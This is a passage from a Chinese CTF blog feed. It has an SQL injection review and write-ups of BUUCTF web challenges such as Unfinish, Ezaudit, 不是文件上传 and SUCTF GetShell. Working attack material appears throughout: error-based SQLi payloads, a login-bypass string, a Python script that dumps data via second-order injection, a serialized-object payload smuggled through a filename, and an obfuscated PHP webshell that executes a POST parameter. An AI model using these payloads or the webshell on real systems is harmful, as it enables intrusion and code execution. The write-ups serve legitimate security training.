class="keyword">new</span> Profile();</span><br><span class="line">$profiled-&gt;except=[<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>];</span><br><span class="line">$profiled-&gt;ext=<span class="string">&quot;png&quot;</span>;</span><br><span class="line">$profiled-&gt;filename=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;</span>;</span><br><span class="line">$profiled-&gt;filename_tmp=<span class="string">&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$registed=<span class="keyword">new</span> Register();</span><br><span class="line">$registed-&gt;registed= <span class="literal">false</span>;</span><br><span class="line">$registed-&gt;checker=$profiled;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($registed)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是我在本地构建的，将所有用到的类整合到一个文件里面，方便进行调试查看赋值过程，否则还需要在开头再加上:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>将序列化后的内容使用cookie传入即可，前提是先上传一个文件马</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103343.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210717103345.png" alt="img" style="zoom:67%;">

]]></content>
  </entry>
  <entry>
    <title>sql注入复习</title>
    <url>/2021/07/17/sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做到sql注入的题目，都没有很敏感了，于是决定要重新复习一下</p>
<h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>源码对用户的输入的内容没有进行很好的过滤机制，导致用户输入的内容拼接到sql语句，影响原本sql语句的功能</p>
<h2 id="sql注入种类："><a href="#sql注入种类：" class="headerlink" title="sql注入种类："></a>sql注入种类：</h2><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><p>顾名思义，就是输入内容会有回显，我们可以通过回显内容判断是否成功过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1&#39;1</span><br><span class="line">?id&#x3D;-1&#39;union select database()--+ #union还需要注意一下字段数</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="数据溢出："><a href="#数据溢出：" class="headerlink" title="数据溢出："></a>数据溢出：</h4><p>就是超过mysql的数据范围会报错：<br>但是又版本限制：&lt;=5.5.4的三皈依出金额图将报错内容显示出来</p>
<h4 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;数据库</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;表名</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;字段</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;&#39;user&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">&#x2F;&#x2F;值</span><br><span class="line">select * from user where 1&#x3D;1 and (select 1 from (select count(*),concat((select id from user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="列名重复"><a href="#列名重复" class="headerlink" title="列名重复"></a>列名重复</h4><p>这个可以用在无列名注入的时候，爆出列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from (select * from user a join user b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</span><br><span class="line">mysql&gt; select * from (select * from user a join user b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#39;username&#39;</span><br></pre></td></tr></table></figure>

<h4 id="xpath语法报错注入"><a href="#xpath语法报错注入" class="headerlink" title="xpath语法报错注入"></a>xpath语法报错注入</h4><p>利用extractvalue或者updatexml</p>
<h3 id="一些特性注入"><a href="#一些特性注入" class="headerlink" title="一些特性注入"></a>一些特性注入</h3><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>看数据库编码是否发生改变</p>
<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,2 union select * from user;</span><br></pre></td></tr></table></figure>

<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>第一次插入数据库的数据被过滤，但是在下一次使用拼凑过程中以输入的形式进行组合，造成语句恶意拼接</p>
<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>注册以后发现用户名显示了,猜测语句是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into XXX (&#39;&#39;,&#39;&#39;,&#39;&#39;) values (&#39;&#39;,&#39;&#39;&#39;&#39;,&#39;&#39;);</span><br></pre></td></tr></table></figure>

<p>所以构造一下注入语句为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxxxxxxxxx insert into XXX (email,username,passwd) values (&#39;&#39;,&#39;&#39;+(select hex(database()))+&#39;&#39;,&#39;&#39;);</span><br></pre></td></tr></table></figure>

<p>在这里我们是使用+号这个运算符作为连接符<br>查询结果可以理解为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0+database()+0</span><br></pre></td></tr></table></figure>

<p>但是如果直接这样相加<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718150013.png" alt="img"></p>
<p>是没有回显的，因为字母+数字在mysql里面加不了为0<br>所以要转化为十六进制，使用hex函数，但是经过测试，有的字符串只经过一次hex还是有字母，毕竟是十六进制~:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718150157.png" alt="img" style="zoom:67%;"><br>所以要经过两次十六进制的转换</p>
<p>接下来是构造语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;&#39;+(select hex(hex(database())))+&#39;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718151556.png" alt="img" style="zoom:67%;">
经过两次hex解码，得知数据库名为web
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718151908.png" alt="img" style="zoom:67%;">
information又被过滤了--，这个时候就直接猜表名为flag就好了~
发现会有科学计数法e的存在，所以会损失精度，所以需要用substr截取

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210718152455.png" alt="img" style="zoom:67%;">
这里学到了一个新姿势，就是substr from for 因为是逗号的时候会报错--

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;0&#39;+(select substr(hex(hex((select * from flag))) from 1 for 10))+&#39;0</span><br></pre></td></tr></table></figure>

<p>位数很多 需要使用脚本，脚本编写思路如下：<br>先在register注册账号，然后用login登录查询</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url&#x3D;&#39;http:&#x2F;&#x2F;707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn&#x2F;register.php&#39;</span><br><span class="line">for i in range(0,20):</span><br><span class="line">    # data&#x3D;&#123;</span><br><span class="line">    #     &quot;email&quot;:str(i)+&#39;@qq.com&#39;,</span><br><span class="line">    #     &quot;username&quot;:&quot;&#39;+substr(hex(hex((select * from flag))) from &quot;+str(i*10+1)+&quot; for 10)+&#39;&quot;,</span><br><span class="line">    #     &quot;password&quot;:&quot;1&quot;</span><br><span class="line">    #     &#125;</span><br><span class="line">    # r&#x3D;requests.post(url&#x3D;url,data&#x3D;data)</span><br><span class="line">    url2 &#x3D; &#39;http:&#x2F;&#x2F;707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn&#x2F;login.php&#39;</span><br><span class="line">    data&#x3D;&#123;</span><br><span class="line">        &quot;email&quot;:str(i)+&#39;@qq.com&#39;,</span><br><span class="line">        &quot;password&quot;:&quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url2,data&#x3D;data,allow_redirects&#x3D;True)</span><br><span class="line"></span><br><span class="line">    print (re.findall(&quot;.*?&lt;&#x2F;span&gt;&quot;,r.text)[0].replace(&#39;&lt;&#x2F;span&gt;&#39;,&#39;&#39;).strip(),end&#x3D;&#39;&#39;)</span><br></pre></td></tr></table></figure>

<p>这里我是先批量注册，然后再批量登录通过正则定位编码位置然后组装<br>由于现在buu太容易崩溃惹。。。所以我就0-5获取一次然后5-10获取一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">363636433631363737423631363433383334363133383633333832443631333033353634324433343634333236363244363233343334333132443333363533393338363536353337333036313338363436333744</span><br></pre></td></tr></table></figure>

<p>结果如上，然后hex解码两次即可</p>
<h3 id="python利用正则表达式快速截取定位内容"><a href="#python利用正则表达式快速截取定位内容" class="headerlink" title="python利用正则表达式快速截取定位内容"></a>python利用正则表达式快速截取定位内容</h3><p>以前就经常在想怎么在一大串的网页回显中截取自己想要的那部分内容，后来看了一下学长的脚本，发现使用正则表达式可以达到这种操作:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">importe re<span class="comment">#引入re库</span></span><br><span class="line">str_txt = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> if (!mobileVisit) &#123;</span></span><br><span class="line"><span class="string"> googletag.defineSlot &quot;div-gpt-ad-15390086850-0&quot;).addService(googletag.pubads());</span></span><br><span class="line"><span class="string">                 &#125;</span></span><br><span class="line"><span class="string">          &quot;&quot;&quot;</span></span><br><span class="line">comment=re.compile(<span class="string">r&#x27;div-gpt-ad-(.*?)-0&#x27;</span>,re.S)</span><br><span class="line">comment1=comment.findall(str_txt)</span><br><span class="line">print(comment1[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>1.使用re正则表达式中的compile函数，在匹配内容的括号中写<strong>（.<em>?）**<br>2.其中.\</em>?代表非贪心算法，表示精准的配对<br>3.在.*?的外面加个括号表示获取括号之间的信息<br>4.在（.*?）两边加上原文本中要匹配信息两旁的信息，例如要想获得字符串“abcdefg”中的cd，就要在（.*?）里面分别加上ab和efg<br>5.compile中使用的第二个参数是re.S，表示正则表达式会将这个字符串作为一个整体，包括”\n“，如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始，不会跨行<br>6.compile()函数返回的是一个匹配对象，单独使用无意义，需要和</strong>findall()**函数搭配使用，返回的是一个列表<br>————————————————</p>
<p>参考：<a href="https://blog.csdn.net/weixin_44346972/article/details/106746133">https://blog.csdn.net/weixin_44346972/article/details/106746133</a></p>
]]></content>
  </entry>
  <entry>
    <title>buu22</title>
    <url>/2021/07/22/buu22/</url>
    <content><![CDATA[<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>随手试了一下<a href="http://www.zip==又有源码了,/">www.zip==又有源码了，</a></p>
<p>前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720090352.png" alt="img" style="zoom:67%;">

<p>和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1=1’1<br>这里有个大坑，以前没有注意过<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720093849.png" alt="img" style="zoom:67%;"></p>
<p>这里要求php的版本是要在5.2.1到7.0.x之间的，不然出来的秘钥是不匹配的</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>计算成功1000次看起来是要写个脚本<br>改天一定要学学算法，感觉自己写的代码都好冗长，可以去世了，测试是可以的，但是由于现在buu限制了，一下子发送太多请求直接500了，服惹<del>弄了时间间隔也没用，so</del>下一题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://e96f1fb4-3b45-487a-ada1-2465e38d9be2.node4.buuoj.cn/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">r = s.post(url=url).text</span><br><span class="line">r1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">     r=r1</span><br><span class="line">    answer1=re.compile(<span class="string">r&#x27;&lt;br&gt;&lt;br&gt;\d&#123;8&#125;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer2=re.compile(<span class="string">r&#x27;\d&#123;8&#125;&lt;br&gt;&lt;br&gt;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    sign=re.compile(<span class="string">r&#x27; \W &#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer1=float(answer1)</span><br><span class="line">    answer2=float(answer2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> == sign:</span><br><span class="line">        fina_answer=answer1+answer2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fina_answer = answer1-answer2</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>:fina_answer</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = s.post(url=url, data=data).text</span><br><span class="line">    <span class="comment">#print(r1)</span></span><br><span class="line">    print(<span class="string">&#x27;*&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;bingo!&quot;</span> <span class="keyword">in</span> r1:</span><br><span class="line">        print(i)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>做题过程中遇到不熟悉的知识点写在前面比较好</p>
<h3 id="php—foreach理解"><a href="#php—foreach理解" class="headerlink" title="php—foreach理解"></a>php—foreach理解</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $arr is now [2, 4, 6, 8]</span></span><br><span class="line"><span class="keyword">unset</span>($value); <span class="comment">// 最后取消掉引用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; &amp;$v) &#123;</span><br><span class="line">    $v = $v * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$arr=2 4 6</span></span><br></pre></td></tr></table></figure>

<p>原题目有文件泄露所以直接上github下载一下源码<br>然后开始审计~：<br>在helper.php中看到一处序列化，其中这个my_ext是图片的大小，即宽度和高度<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721182936.png" alt="img" style="zoom:67%;"></p>
<p>getfile()方法，存在check机制<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183219.png" alt="img" style="zoom:67%;"></p>
<p>严格的白名单检测机制，因为<br><strong>strrchr() 函数</strong><br>（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183423.png" alt="img" style="zoom:67%;"><br>这里有个文件读取，但是path似乎被写死了，暂时还没找到利用点<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721194904.png" alt="img" style="zoom:67%;"><br>继续看一下其他文件，在show.php中看到了显示文件的代码，对attr_temp的内容进行反序列化，前面对它是进行了序列化的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721195511.png" alt="img" style="zoom:67%;"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目给了反序列化，但是没看到一些有用的跳板，感觉是要结合数据库进行攻击，最后利用file_get_contents得到flag，但是感觉对于那些值可控有点茫然，所以决定传值跟一下<br>首先是数据库配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database pic_base</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210801.jpg" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210800.png" alt="img" style="zoom:67%;">

<p>可以发现文件名是可控的并且最后是attr参与反序列化，注意到又包含了helper.php，所以感觉是可以进行config值的更改的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210635.png" alt="img" style="zoom:67%;"></p>
<p>所以思路如下：</p>
<p><code>首先构造反序列化对config重新赋值，然后通过sql注入使本来应该title的序列化语句跑到attr字段，然后通过访问该图片，即可获得flag</code><br>构造反序列化语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $ifview=<span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">protected</span> $config=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize($a);</span><br></pre></td></tr></table></figure>

<p>然后由于这个是protected<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084236.png" alt="img"></p>
<p>并且题目中对*号做了处理，所以我们对其进行十六进制加密就行了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084333.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure>

<p>然后构造sql注入语句,抓包改文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d&#39;)#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;12&#39;,&#39;534b340ce39e1079.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;534b340ce39e1079.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:969;s:6:&quot;height&quot;;i:335;&#125;&#39;)</span><br></pre></td></tr></table></figure>

<p>成功插入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085557.png" alt="img" style="zoom:67%;"><br>获得flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085725.png" alt="img"></p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>看源码，他除了源码的前五位不检查，其他都会和黑名单比对，但是我们不知道过滤了啥，所以需要fuzz一下,顺便学习一下如何编写文件上传的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">r&quot;http://c86c138f-b79c-45a8-9f85-6841c06aafcc.node4.buuoj.cn/index.php?act=upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_post</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        str_list.append(chr(i))</span><br><span class="line">    <span class="keyword">for</span> str <span class="keyword">in</span> str_list:</span><br><span class="line">        file_post=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        -----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;屏幕截图(3).png&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12345<span class="subst">&#123;str&#125;</span></span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交</span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734--</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r=s.post(url,headers=headers,data=file_post.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Stored&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">&quot;该字符可以通过:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;过滤字符:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload_post(url)</span><br></pre></td></tr></table></figure>

<p>经过测试可以通过的字符有：<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>，然后就是汉字了<br>接下里的思路就是思考一下如何构造马去进行上传，如何通过现有字符构造出被过滤的字符，用得一般就是异或操作或者取反，但是异或符号被过滤了，所以这里就用取反去构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__ = [];</span><br><span class="line">$_ = ($__ == $__);<span class="comment">//$_ = 1</span></span><br><span class="line"></span><br><span class="line">$__ = ~(融);</span><br><span class="line">$___ = $__[$_];</span><br><span class="line"><span class="keyword">print</span>($___);<span class="comment">//输出a</span></span><br></pre></td></tr></table></figure>

<p>通过以上方法我们可以构造出我们需要的字母，接下来写一个fuzz脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_split_unicode</span>(<span class="params">$str,$l=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($l&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $ret=<span class="keyword">array</span>();</span><br><span class="line">        $len=mb_strlen($str,<span class="string">&#x27;UTF-8&#x27;</span>);<span class="comment">//mb_strlen获取长度</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i += $l) &#123;</span><br><span class="line">            $ret[] = mb_substr($str, $i, $l, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> preg_split(<span class="string">&quot;//u&quot;</span>, $str, <span class="number">-1</span>, PREG_SPLIT_NO_EMPTY);<span class="comment">//preg_split — 通过一个正则表达式分隔字符串，返回汉字</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="string">&#x27;放你的汉字要多一点才行&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$arr_str=str_split_unicode($s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($s) ; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $arr_str[$i].<span class="string">&#x27; ------- &#x27;</span>.~$arr_str[$i][<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来构造马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">a&#x3D;env</span><br></pre></td></tr></table></figure>

<p>然后访问环境变量就可以看到flag了，为啥是环境变量=-=，好像是题目出了问题，本来在根目录的，</p>
]]></content>
  </entry>
  <entry>
    <title>lctf babyphp&#39;s revenge</title>
    <url>/2021/07/20/lctf-babyphp-s-revenge/</url>
    <content><![CDATA[<h2 id="php中session反序列化机制"><a href="#php中session反序列化机制" class="headerlink" title="php中session反序列化机制"></a>php中session反序列化机制</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>session中有关序列化配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.serialize_handler&#x3D;php	   	表明session的默认序列话引擎使用的是php序列话引擎</span><br></pre></td></tr></table></figure>

<p><code>session.serialize_handler</code>是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
<ul>
<li><p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p>
<p>例：</p>
<p><code>names:6:&quot;spoock&quot;;</code></p>
<p><code>name|s:6:&quot;spoock&quot;;</code>其中name是键值，s:6:”spoock”是反序列化的结果</p>
</li>
<li><p>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值<br>例：<br><code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;spoock&quot;&#125;</code>对一整个name=spoock进行序列化存储</p>
</li>
<li><p>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p>
<p>例：</p>
<p><code>name|s:6:&quot;spoock&quot;;</code>其中name是键值，s:6:”spoock”是反序列化的结果</p>
</li>
</ul>
<p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>。示例代码如下：</p>
